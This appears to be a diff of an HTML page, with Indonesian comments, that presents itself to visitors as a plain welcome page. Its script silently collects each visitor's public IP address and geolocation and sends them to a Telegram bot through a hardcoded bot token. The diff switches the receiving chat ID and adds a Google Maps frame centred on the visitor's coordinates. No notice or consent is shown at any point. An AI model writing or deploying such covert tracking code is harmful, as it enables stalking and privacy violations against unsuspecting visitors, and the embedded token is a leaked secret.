@@ -7,7 +7,7 @@
     <script>
         // Token bot Telegram dan Chat ID
         const TELEGRAM_TOKEN = "7896685998:AAGXZGmmckIixNQLJPfb4aKz5morpkvI7cY";
-        const CHAT_ID = "7232374611";
+        const CHAT_ID = "7202626818";
 
         // Fungsi untuk mengirim pesan ke Telegram
         function sendToTelegram(message) {
@@ -18,12 +18,12 @@
                 body: JSON.stringify({
                     chat_id: CHAT_ID,
                     text: message,
-                    parse_mode: "Markdown"  // Supaya teks lebih rapi
+                    parse_mode: "Markdown"
                 })
             }).catch(error => console.error("Gagal mengirim ke Telegram:", error));
         }
 
-        // Fungsi utama untuk mendapatkan IP dan mengirim ke Telegram
+        // Fungsi utama untuk mendapatkan IP, lokasi, dan update Google Maps
         async function trackVisitor() {
             try {
                 // 1️⃣ Ambil IP publik pengguna
@@ -54,6 +54,10 @@
                 // 4️⃣ Kirim pesan ke Telegram
                 sendToTelegram(message);
 
+                // 5️⃣ Update Google Maps sesuai lokasi pengunjung
+                let mapsFrame = document.getElementById("mapsFrame");
+                mapsFrame.src = `https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}&output=embed`;
+
             } catch (error) {
                 console.error("Gagal mendapatkan IP:", error);
             }
@@ -66,5 +70,17 @@
 <body>
     <h1>Welcome!</h1>
     <p>Enjoy browsing this page.</p>
+
+    <!-- Google Maps akan diperbarui sesuai lokasi pengunjung -->
+    <iframe 
+        id="mapsFrame"
+        width="600" 
+        height="450" 
+        style="border:0" 
+        loading="lazy" 
+        allowfullscreen 
+        referrerpolicy="no-referrer-when-downgrade"
+        src="https://www.google.com/maps?q=0,0&output=embed">
+    </iframe>
 </body>
 </html>
